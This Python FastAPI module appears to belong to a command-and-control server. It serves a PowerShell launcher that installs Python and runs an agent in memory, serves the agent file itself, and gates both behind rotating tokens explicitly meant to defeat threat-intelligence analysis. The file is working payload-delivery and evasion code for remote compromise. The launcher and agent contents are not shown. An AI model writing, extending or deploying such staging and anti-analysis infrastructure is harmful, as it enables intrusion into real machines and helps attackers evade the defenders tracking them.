"""
Payload Generation Routes
Handles payload token management and payload serving with security controls
"""

from pathlib import Path
from typing import Dict
from fastapi import APIRouter, Request, HTTPException, Depends
from fastapi.responses import FileResponse, Response

from config import payload_token_manager
from core.token_manager import PayloadTokenManager
from dependencies import get_current_user


router = APIRouter(prefix="", tags=["payloads"])


@router.get("/api/payload-token")
def get_payload_token(user: Dict = Depends(get_current_user)):
    """
    Get the current valid payload token and its expiry time.
    Tokens rotate every 5 minutes to prevent threat intelligence analysis.
    """
    return {
        "token": payload_token_manager.get_current_token(),
        "expires_in": payload_token_manager.get_time_until_expiry(),
        "lifetime": PayloadTokenManager.TOKEN_LIFETIME
    }


@router.get("/payload/launcher.ps1")
def get_launcher_script(request: Request, id: str = None):
    """
    Serve PowerShell launcher script for agent deployment
    This script auto-installs Python if needed and executes the agent in memory

    Protected by time-based token validation to prevent threat intelligence analysis.
    """
    # Validate token - prevents unauthorized access and threat intel analysis
    if not id or not payload_token_manager.validate_token(id):
        raise HTTPException(status_code=404, detail="Not found")

    # Use the Host header from the HTTP request - this contains the address the client used
    # to access the server (e.g., "192.168.1.10:8000"), ensuring remote agents connect properly
    server_url = request.headers.get("host") or f"{request.url.hostname}:{request.url.port or 8000}"

    # Load the launcher template from file
    template_path = Path(__file__).parent.parent / "files" / "launcher.ps1"

    if not template_path.exists():
        raise HTTPException(status_code=404, detail="Launcher template not found")

    # Read template and replace placeholder with actual server URL
    with open(template_path, 'r', encoding='utf-8') as f:
        launcher_script = f.read()

    # Replace the {{SERVER_URL}} placeholder with actual server address
    launcher_script = launcher_script.replace("{{SERVER_URL}}", server_url)

    return Response(content=launcher_script, media_type="text/plain")


@router.get("/payload/allinone.py")
def get_agent_payload():
    """
    Serve the agent Python file for deployment
    This is the all-in-one agent with all dependencies in a single file
    """
    agent_path = Path(__file__).parent.parent.parent / "agent" / "allinone.py"

    if not agent_path.exists():
        raise HTTPException(status_code=404, detail="Agent file not found")

    return FileResponse(
        path=str(agent_path),
        filename="allinone.py",
        media_type="text/plain"
    )
